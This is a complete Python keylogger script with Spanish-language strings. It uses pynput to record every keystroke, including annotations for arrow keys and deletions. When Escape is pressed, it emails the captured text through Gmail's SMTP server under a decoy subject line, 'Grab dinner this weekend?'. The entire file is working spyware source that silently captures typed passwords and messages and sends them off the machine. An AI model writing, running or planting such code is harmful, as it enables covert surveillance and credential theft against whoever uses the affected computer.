from pynput import keyboard
import smtplib
import os
from email.message import EmailMessage

email = os.environ.get("EMAIL_USER")
passw = os.environ.get("EMAIL_PASS")
palabra = []
text = ""
item = ""

# Collect events until released
def read():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,
    ) as listener:
        listener.join()


def on_press(key):
    # palabra.append(key.char)
    global text
    #   text += str(key.char)
    if str(key) == "Key.enter":
        text += "\n"
    elif str(key) == "Key.space":
        text += " "
    elif str(key) == "Key.backspace":
        text += "%se borró una letra%"
    elif str(key) == "Key.up":
        text += "%flecha arriba%"
    elif str(key) == "Key.down":
        text +="%flecha abajo%"
    elif str(key) == "Key.left":
        text +="%flecha izquierda%"
    elif str(key) == "Key.right":
        text +="%flecha derecha%"
    elif str(key) == "Key.esc" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(
            key) == "Key.alt_gr" or str(key) == "Key.ctrl_l":
        pass
    else:
        print(key)
        text += key.char


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def send(text):
    msg = EmailMessage()
    msg['Subject'] = 'Grab dinner this weekend?'
    msg['From'] = email
    msg['To'] = email
    msg.set_content(f'Se detectó lo siguiente:\n{text}')

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, passw)
        smtp.send_message(msg)

def test(text):
    print("Al final sale:\n{0}".format(text))

def main():
    read()
    test(text)
    send(text)


if __name__ == "__main__":
    main()


